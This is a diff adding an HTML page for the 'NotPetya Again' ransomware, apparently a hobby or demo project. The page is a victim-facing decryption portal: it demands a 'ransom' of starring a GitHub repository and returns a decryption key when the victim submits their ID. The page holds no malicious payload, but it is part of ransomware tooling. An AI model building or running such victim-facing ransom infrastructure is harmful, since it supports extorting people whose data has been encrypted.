@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>NotPetya Again Decryptor</title>
+</head>
+<body>
+    <h1>NotPetya Again Decryptor</h1>
+    <p>
+        If you are here it's because your computer got encrypted by the NotPetya Again ransomware.<br>
+        <br>
+        <strong>To recover your data, the ransom is give a star on the 'sven-eliasen/notpetyaagain_boot' Github repository (create an account idc).</strong><br>
+        Then, and only then, you can paste your ID found in the ransom note just below.<br>
+        <br>
+        Once you got your decryption key, enter it directly in the terminal below the ransom message, and after a while, Windows will boot normally.
+    </p>
+    <br>
+    <label for="id">
+        <h4>Enter ID:</h4>
+    </label>
+    <textarea name="id" id="id" cols="100"></textarea><br>
+    <input type="submit" id="submit" value="Please I'm desperate !" onclick="get_key()">
+    <br>
+    <br>
+    <label for="result">
+        <h4>Your decryption key:</h4>
+    </label>
+    <textarea id="result" cols="100" readonly></textarea>
+    <script>
+        function get_key() {
+            let result = document.getElementById("result")
+
+            let id = document.getElementById('id').value
+            //console.log(id)
+            fetch("get_key", {
+                method: "POST",
+                headers: {
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({id: id})
+            }).then(res => {
+                //console.log(res)
+                res.json().then( content => {
+                    //console.log(content)
+                    result.innerText = content.data
+                    }
+                )
+            }).catch(e => {
+                console.log(e)
+            })
+        }
+
+    </script>
+</body>
+</html>
